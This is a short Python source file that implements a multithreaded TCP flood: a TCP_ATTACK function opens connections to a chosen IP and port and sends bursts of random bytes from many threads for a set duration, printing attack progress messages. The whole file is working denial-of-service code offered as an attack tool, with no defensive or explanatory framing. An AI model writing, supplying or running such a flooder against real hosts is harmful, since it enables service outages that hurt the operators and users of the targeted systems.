import random
import time
import socket
from threading import Thread

def TCP_ATTACK(threads, attack_time, target):
	# Finish
	global FINISH
	FINISH = False
	target_ip = target.split(":")[0]
	target_port = int(target.split(":")[1])

	print("[#] Attack started for " + str(attack_time) + " secounds..")
	

	threads_list = []

	# TCP flood
	def tcp_flood():
		global FINISH

		while True:
			if FINISH:
				break
			
			# Create socket
			try:
				sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
				sock.connect((target_ip, target_port))
			except Exception as e:
				print(e)
				print("[-] Failed to create TCP connection")
				exit()

			# Send random payload
			try:
				for _ in range(16):
					payload = random._urandom(random.randint(1, 120))
					sock.send(payload)
			except Exception as e:
				print(e)
				time.sleep(0.25)
				continue
			else:
				print("[+] TCP random packet sent! Payload size: " + str(len(payload)))

	# Start threads
	for thread in range(threads):
		print("[#] Staring thread " + str(thread))
		t = Thread(target = tcp_flood)
		t.start()
		threads_list.append(t)
	# Sleep selected secounds
	time.sleep(attack_time)
	# Terminate threads
	for thread in threads_list:
		FINISH = True
		thread.join()
	
	print("[!] TCP attack stopped!")